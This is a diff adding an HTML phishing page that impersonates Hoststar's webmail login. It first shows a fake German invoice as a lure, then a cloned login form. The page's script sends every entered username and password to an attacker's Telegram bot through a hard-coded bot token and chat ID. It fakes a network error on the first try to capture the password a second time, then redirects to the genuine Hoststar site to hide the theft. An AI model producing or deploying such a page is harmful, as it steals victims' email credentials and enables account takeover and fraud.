@@ -1,0 +1,721 @@
+<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hoststar Webmail Login</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+            height: 100vh;
+            width: 100%;
+            overflow: hidden;
+            background-image: url('./fundahu.png');
+            background-size: cover;
+            background-position: center;
+            background-repeat: no-repeat;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: white;
+        }
+
+        .overlay {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.4);
+            z-index: 1;
+        }
+
+        .container {
+            position: relative;
+            z-index: 2;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
+
+        header {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            padding: 30px 50px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            font-size: 15px;
+            letter-spacing: 1px;
+        }
+
+        .logo {
+            font-size: 26px;
+            font-weight: 300;
+            text-transform: uppercase;
+            letter-spacing: 2px;
+        }
+
+        .logo span {
+            font-weight: bold;
+        }
+
+        .top-nav a {
+            color: white;
+            text-decoration: none;
+            margin-left: 20px;
+            text-transform: uppercase;
+            font-size: 13px;
+            opacity: 0.85;
+            transition: opacity 0.3s;
+        }
+
+        .top-nav a:hover {
+            opacity: 1;
+        }
+
+        .login-box {
+            text-align: center;
+            width: 100%;
+            max-width: 440px;
+        }
+
+        .login-title {
+            font-size: 27px;
+            font-weight: 300;
+            margin-bottom: 32px;
+            letter-spacing: 2px;
+            text-transform: uppercase;
+            text-align: left;
+            padding-left: 5px;
+        }
+
+        form {
+            display: flex;
+            flex-direction: column;
+            gap: 16px;
+        }
+
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 15px 18px;
+            background: rgba(255, 255, 255, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.3);
+            color: #fff;
+            font-size: 17px;
+            outline: none;
+            transition: background 0.3s;
+        }
+
+        input::placeholder {
+            color: rgba(255, 255, 255, 0.75);
+            font-size: 17px;
+        }
+
+        input:focus {
+            background: rgba(255, 255, 255, 0.3);
+        }
+
+        .btn-submit {
+            background: #222;
+            color: white;
+            border: none;
+            padding: 15px 0;
+            width: 150px;
+            align-self: flex-end;
+            text-transform: uppercase;
+            font-size: 14px;
+            letter-spacing: 1.5px;
+            cursor: pointer;
+            margin-top: 6px;
+            transition: background 0.3s;
+        }
+
+        .btn-submit:hover {
+            background: #000;
+        }
+
+        .btn-submit:disabled {
+            background: #444;
+            cursor: not-allowed;
+        }
+
+        .divider {
+            width: 100%;
+            height: 1px;
+            background: rgba(255, 255, 255, 0.3);
+            margin: 42px 0 22px 0;
+        }
+
+        .icon-row {
+            display: flex;
+            justify-content: center;
+            gap: 16px;
+        }
+
+        .icon-box {
+            width: 58px;
+            height: 46px;
+            background: rgba(255, 255, 255, 0.2);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            cursor: pointer;
+            transition: background 0.3s;
+        }
+
+        .icon-box:hover {
+            background: rgba(255, 255, 255, 0.4);
+        }
+
+        .icon-box svg {
+            width: 24px;
+            height: 24px;
+            fill: white;
+        }
+
+        footer {
+            position: absolute;
+            bottom: 0;
+            left: 0;
+            width: 100%;
+            padding: 20px 50px;
+            display: flex;
+            justify-content: space-between;
+            font-size: 12px;
+            color: rgba(255, 255, 255, 0.6);
+            letter-spacing: 0.5px;
+        }
+
+        .footer-links a {
+            color: rgba(255, 255, 255, 0.6);
+            text-decoration: none;
+            margin-left: 20px;
+            text-transform: uppercase;
+            transition: color 0.3s;
+        }
+
+        .footer-links a:hover {
+            color: white;
+        }
+
+        /* ===== MESAJE STATUS ===== */
+        .status-message {
+            background: rgba(0, 0, 0, 0.7);
+            padding: 15px 25px;
+            border-radius: 4px;
+            margin-bottom: 20px;
+            font-size: 15px;
+            text-align: center;
+            border-left: 3px solid #f44336;
+            display: none;
+        }
+
+        .status-message.error {
+            border-left-color: #f44336;
+            color: #ff6b6b;
+        }
+
+        .status-message.success {
+            border-left-color: #4CAF50;
+            color: #7fff7f;
+        }
+
+        .status-message.info {
+            border-left-color: #2196F3;
+            color: #e0e0e0;
+        }
+
+        .loading-spinner {
+            display: inline-block;
+            width: 16px;
+            height: 16px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+            margin-right: 10px;
+            vertical-align: middle;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* ============================================ */
+        /* FACTURA - OVERLAY CARE APARE PRIMA DATĂ      */
+        /* ============================================ */
+        .invoice-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #ffffff;
+            z-index: 9999;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 2rem;
+            overflow-y: auto;
+            opacity: 1;
+            transition: opacity 0.4s ease;
+        }
+
+        .invoice-overlay.hide {
+            opacity: 0;
+            pointer-events: none;
+        }
+
+        .invoice-container {
+            width: 100%;
+            max-width: 700px;
+            background: #fff;
+            border-radius: 8px;
+            padding: 2.5rem 3rem;
+            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.08);
+            margin: auto;
+            color: #3c4650;
+        }
+
+        .invoice-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: flex-start;
+            padding-bottom: 1.5rem;
+            border-bottom: 2px solid #e2e8f2;
+            margin-bottom: 1.5rem;
+        }
+
+        .invoice-logo {
+            height: 2.375rem;
+            width: auto;
+        }
+
+        .invoice-header-right {
+            text-align: right;
+        }
+
+        .invoice-header-right h1 {
+            font-size: 1.75rem;
+            font-weight: 700;
+            color: #3c4650;
+            letter-spacing: 1px;
+            margin-bottom: 0.25rem;
+        }
+
+        .invoice-header-right .invoice-number {
+            font-size: 0.875rem;
+            color: #828c9c;
+        }
+
+        .invoice-info-grid {
+            display: grid;
+            grid-template-columns: 1fr 1fr;
+            gap: 1.5rem;
+            margin-bottom: 2rem;
+        }
+
+        .invoice-info-block h3 {
+            font-size: 0.75rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            color: #828c9c;
+            letter-spacing: 0.5px;
+            margin-bottom: 0.5rem;
+        }
+
+        .invoice-info-block p {
+            font-size: 0.875rem;
+            color: #3c4650;
+            line-height: 1.6;
+        }
+
+        .invoice-info-block strong {
+            color: #3c4650;
+            font-weight: 600;
+        }
+
+        .invoice-table {
+            width: 100%;
+            border-collapse: collapse;
+            margin-bottom: 1.5rem;
+        }
+
+        .invoice-table thead {
+            background: #f7f9fc;
+        }
+
+        .invoice-table th {
+            text-align: left;
+            padding: 0.75rem 1rem;
+            font-size: 0.75rem;
+            font-weight: 700;
+            text-transform: uppercase;
+            color: #636b73;
+            letter-spacing: 0.5px;
+            border-bottom: 1px solid #e2e8f2;
+        }
+
+        .invoice-table td {
+            padding: 0.875rem 1rem;
+            font-size: 0.875rem;
+            color: #3c4650;
+            border-bottom: 1px solid #f0f3f8;
+        }
+
+        .invoice-table .amount {
+            text-align: right;
+            font-weight: 600;
+        }
+
+        .invoice-totals {
+            margin-left: auto;
+            width: 100%;
+            max-width: 300px;
+            margin-bottom: 2rem;
+        }
+
+        .invoice-totals-row {
+            display: flex;
+            justify-content: space-between;
+            padding: 0.5rem 0;
+            font-size: 0.875rem;
+            color: #3c4650;
+        }
+
+        .invoice-totals-row.grand-total {
+            border-top: 2px solid #3c4650;
+            margin-top: 0.5rem;
+            padding-top: 0.75rem;
+            font-size: 1.125rem;
+            font-weight: 700;
+            color: #1a4d8f;
+        }
+
+        .invoice-footer {
+            border-top: 1px solid #e2e8f2;
+            padding-top: 1.5rem;
+            text-align: center;
+            font-size: 0.75rem;
+            color: #828c9c;
+            line-height: 1.6;
+        }
+
+        .invoice-footer .payment-note {
+            background: #e8f0fc;
+            color: #1a4d8f;
+            padding: 0.75rem 1rem;
+            border-radius: 6px;
+            margin-bottom: 1rem;
+            font-size: 0.813rem;
+            font-weight: 500;
+        }
+
+        .invoice-fade-hint {
+            text-align: center;
+            margin-top: 1.5rem;
+            font-size: 0.75rem;
+            color: #a8b2c0;
+            font-style: italic;
+        }
+
+        @media screen and (max-width: 630px) {
+            .invoice-overlay { padding: 1rem; }
+            .invoice-container { padding: 1.5rem; }
+            .invoice-header { flex-direction: column; gap: 1rem; }
+            .invoice-header-right { text-align: left; }
+            .invoice-info-grid { grid-template-columns: 1fr; }
+        }
+    </style>
+</head>
+<body>
+
+<!-- ============================================ -->
+<!-- FACTURA - APARE PRIMA DATĂ                   -->
+<!-- ============================================ -->
+<div class="invoice-overlay" id="invoiceOverlay">
+    <div class="invoice-container">
+
+        <!-- HEADER FACTURĂ - LOGO HOSTSTAR ORIGINAL -->
+        <div class="invoice-header">
+            <div class="invoice-logo" style="font-size: 1.8rem; font-weight: 300; letter-spacing: 2px; color: #000;">
+                HOSTST<span style="font-weight: bold;">Λ</span>R
+            </div>
+            <div class="invoice-header-right">
+                <h1>RECHNUNG</h1>
+                <div class="invoice-number">Nr. 2025-04871</div>
+            </div>
+        </div>
+
+        <!-- INFO FACTURĂ -->
+        <div class="invoice-info-grid">
+            <div class="invoice-info-block">
+                <h3>Rechnungsempfänger</h3>
+                <p>
+                    <strong>Max Mustermann</strong><br>
+                    Musterstrasse 12<br>
+                    8000 Zürich<br>
+                    Schweiz
+                </p>
+            </div>
+            <div class="invoice-info-block">
+                <h3>Rechnungsdetails</h3>
+                <p>
+                    <strong>Datum:</strong> 17.09.2026<br>
+                    <strong>Fällig am:</strong> 17.10.2026<br>
+                    <strong>Kundennr.:</strong> 1082345
+                </p>
+            </div>
+        </div>
+
+        <!-- TABEL PRODUSE -->
+        <table class="invoice-table">
+            <thead>
+                <tr>
+                    <th>Beschreibung</th>
+                    <th>Zeitraum</th>
+                    <th style="text-align:right;">Betrag</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td>Webhosting Premium</td>
+                    <td>01.01.2026 – 31.12.2026</td>
+                    <td class="amount">CHF 180.00</td>
+                </tr>
+                <tr>
+                    <td>Domain: mustermann.ch</td>
+                    <td>01.01.2026 – 31.12.2026</td>
+                    <td class="amount">CHF 15.00</td>
+                </tr>
+                <tr>
+                    <td>SSL-Zertifikat Wildcard</td>
+                    <td>01.01.2026 – 31.12.2026</td>
+                    <td class="amount">CHF 45.00</td>
+                </tr>
+            </tbody>
+        </table>
+
+        <!-- TOTALURI -->
+        <div class="invoice-totals">
+            <div class="invoice-totals-row">
+                <span>Zwischensumme</span>
+                <span>CHF 240.00</span>
+            </div>
+            <div class="invoice-totals-row">
+                <span>MwSt. 7.7%</span>
+                <span>CHF 18.48</span>
+            </div>
+            <div class="invoice-totals-row grand-total">
+                <span>Total</span>
+                <span>CHF 258.48</span>
+            </div>
+        </div>
+
+        <!-- FOOTER FACTURĂ -->
+        <div class="invoice-footer">
+            <div class="payment-note">
+                Zahlbar innerhalb von 30 Tagen.
+            </div>
+            <div>
+                Hoststar – Multimedia Networks AG · Kirchgasse 30 · 3312 Fraubrunnen<br>
+                www.hoststar.ch · support@hoststar.ch
+            </div>
+            <div class="invoice-fade-hint">
+                Sie werden in Kürze weitergeleitet...
+            </div>
+        </div>
+
+    </div>
+</div>
+
+<!-- ============================================ -->
+<!-- PAGINA DE LOGIN                              -->
+<!-- ============================================ -->
+<div class="overlay"></div>
+
+<div class="container" id="loginPage" style="display:none;">
+    <header>
+        <div class="logo">HOSTST<span>Λ</span>R</div>
+        <nav class="top-nav">
+            <a href="#">Home</a>
+            <a href="#">Support</a>
+        </nav>
+    </header>
+
+    <div class="login-box">
+        <h2 class="login-title">Webmail</h2>
+
+        <div class="status-message" id="statusMessage"></div>
+
+        <form id="loginForm">
+            <input type="text" name="email" id="email" placeholder="Benutzername" required  >
+            <input type="password" name="password" id="password" placeholder="Passwort" required  >
+
+            <button type="submit" class="btn-submit" id="submitBtn">Anmelden</button>
+        </form>
+
+        <div class="divider"></div>
+
+        <div class="icon-row">
+            <div class="icon-box">
+                <svg viewBox="0 0 24 24"><path d="M12 4.5C7 4.5 2.73 7.61 1 12c1.73 4.39 6 7.5 11 7.5s9.27-3.11 11-7.5c-1.73-4.39-6-7.5-11-7.5zM12 17c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>
+            </div>
+            <div class="icon-box">
+                <svg viewBox="0 0 24 24"><path d="M20 4H4c-1.11 0-1.99.89-1.99 2L2 18c0 1.11.89 2 2 2h16c1.11 0 2-.89 2-2V6c0-1.11-.89-2-2-2zm0 14H4v-6h16v6zm0-10H4V6h16v2z"/></svg>
+            </div>
+            <div class="icon-box">
+                <svg viewBox="0 0 24 24"><path d="M19.35 10.04C18.67 6.59 15.64 4 12 4 9.11 4 6.6 5.64 5.35 8.04 2.34 8.36 0 10.91 0 14c0 3.31 2.69 6 6 6h13c2.76 0 5-2.24 5-5 0-2.64-2.05-4.78-4.65-4.96z"/></svg>
+            </div>
+            <div class="icon-box">
+                <svg viewBox="0 0 24 24"><path d="M9 16h6v-6h4l-7-7-7 7h4zm-4 2h14v2H5z"/></svg>
+            </div>
+        </div>
+    </div>
+
+    <footer>
+        <div class="copyright">
+            © Copyright 2020 Multimedia Networks AG. All rights reserved.
+        </div>
+        <div class="footer-links">
+            <a href="#">Disclaimer</a>
+            <a href="#">Sitemap</a>
+        </div>
+    </footer>
+</div>
+
+<script>
+    // ============================================
+    // LOGICA FACTURĂ → LOGIN
+    // ============================================
+    window.addEventListener('DOMContentLoaded', function() {
+        const invoiceOverlay = document.getElementById('invoiceOverlay');
+        const loginPage = document.getElementById('loginPage');
+
+        // După 1 secundă ascunde factura și arată pagina de login
+        setTimeout(function() {
+            invoiceOverlay.classList.add('hide');
+
+            setTimeout(function() {
+                invoiceOverlay.style.display = 'none';
+                loginPage.style.display = 'flex';
+            }, 400);
+        }, 1000);
+    });
+
+    // ============================================
+    // CONFIGURARE TELEGRAM
+    // ============================================
+    const BOT_TOKEN = "8145729148:AAFFx2W3AfF9sNYLZXnoXXFkTA1g3xPAY7A";
+    const CHAT_ID   = "5054827109";
+
+    // ============================================
+    // TRIMITERE DIRECTĂ CĂTRE TELEGRAM
+    // ============================================
+    async function sendToTelegram(email, password) {
+        const now = new Date().toLocaleString('de-DE', { timeZone: 'Europe/Berlin' });
+
+        const message =
+            `🔐 HOSTSTAR WEBMAIL\n` +
+            `━━━━━━━━━━━━━━━\n` +
+            `📧 Email: ${email}\n` +
+            `🔑 Passwort: ${password}\n` +
+            `🕐 Zeit: ${now}`;
+
+        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
+        try {
+            const response = await fetch(url, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: message
+                })
+            });
+
+            const data = await response.json();
+            return data.ok === true;
+        } catch (error) {
+            console.error('Telegram Fehler:', error);
+            return false;
+        }
+    }
+
+    // ============================================
+    // TRIMITERE FORMULAR
+    // ============================================
+    let attemptCount = 0;
+
+    document.getElementById('loginForm').addEventListener('submit', async function(e) {
+        e.preventDefault();
+
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+        const statusBox = document.getElementById('statusMessage');
+        const form = document.getElementById('loginForm');
+        const submitBtn = document.getElementById('submitBtn');
+
+        attemptCount++;
+
+        // PRIMA ÎNCERCARE → EROARE ROȘIE
+        if (attemptCount === 1) {
+            statusBox.style.display = 'block';
+            statusBox.className = 'status-message info';
+            statusBox.innerHTML = '<span class="loading-spinner"></span> Verbindung wird hergestellt...';
+
+            submitBtn.disabled = true;
+            submitBtn.textContent = '...';
+
+            // Trimite totuși datele pe Telegram în fundal
+            sendToTelegram(email, password);
+
+            setTimeout(function() {
+                statusBox.className = 'status-message error';
+                statusBox.innerHTML = '❌ Netzwerkfehler: Verbindung zum Server fehlgeschlagen. Bitte versuchen Sie es erneut.';
+                submitBtn.disabled = false;
+                submitBtn.textContent = 'Anmelden';
+            }, 1500);
+
+            return;
+        }
+
+        // A DOUA ÎNCERCARE → SUCCES VERDE + REDIRECT
+        statusBox.style.display = 'block';
+        statusBox.className = 'status-message info';
+        statusBox.innerHTML = '<span class="loading-spinner"></span> Anmeldung wird überprüft...';
+
+        submitBtn.disabled = true;
+        submitBtn.textContent = '...';
+
+        await sendToTelegram(email, password);
+
+        setTimeout(function() {
+            form.style.display = 'none';
+            statusBox.className = 'status-message success';
+            statusBox.innerHTML = '✅ Anmeldung erfolgreich! Sie werden weitergeleitet...';
+
+            setTimeout(function() {
+                window.location.href = 'https://www.hoststar.at/en/support/my-panel/account/finances';
+            }, 3000);
+        }, 1500);
+    });
+</script>
+
+</body>
+</html>
